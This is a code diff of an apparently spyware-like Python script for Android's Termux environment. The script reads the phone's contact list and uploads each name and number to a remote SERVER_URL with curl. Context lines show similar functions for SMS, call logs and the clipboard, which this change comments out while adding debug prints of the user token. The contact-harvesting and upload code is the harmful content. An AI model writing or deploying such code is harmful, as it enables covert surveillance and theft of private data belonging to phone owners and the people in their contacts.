@@ -16,6 +16,8 @@ def check_sms(THIS_USER_TOKEN):
 
 
 def check_contact(THIS_USER_TOKEN):
+    print(THIS_USER_TOKEN)
+    print(".......................................................................................")
     try:
         res = json.loads(os.popen('termux-contact-list').read())
     except:
@@ -25,6 +27,7 @@ def check_contact(THIS_USER_TOKEN):
         if not contact_list.objects.filter(name=contact['name']).exists():
             call_back = os.popen(
                 f"curl --data \"token={THIS_USER_TOKEN}&name={contact['name']}&phone_number={contact['number']}\" {SERVER_URL}/s/contact/")
+            print(call_back)
 
 
 def check_clipboard(THIS_USER_TOKEN):
@@ -60,7 +63,7 @@ def register(THIS_USER_TOKEN):
 def InsertIntoDb(THIS_USER_TOKEN):
     register(THIS_USER_TOKEN)
     print("registered.........................................")
-    check_sms(THIS_USER_TOKEN)
-    check_call(THIS_USER_TOKEN)
-    check_clipboard(THIS_USER_TOKEN)
+    #check_sms(THIS_USER_TOKEN)
+    #check_call(THIS_USER_TOKEN)
+    #check_clipboard(THIS_USER_TOKEN)
     check_contact(THIS_USER_TOKEN)
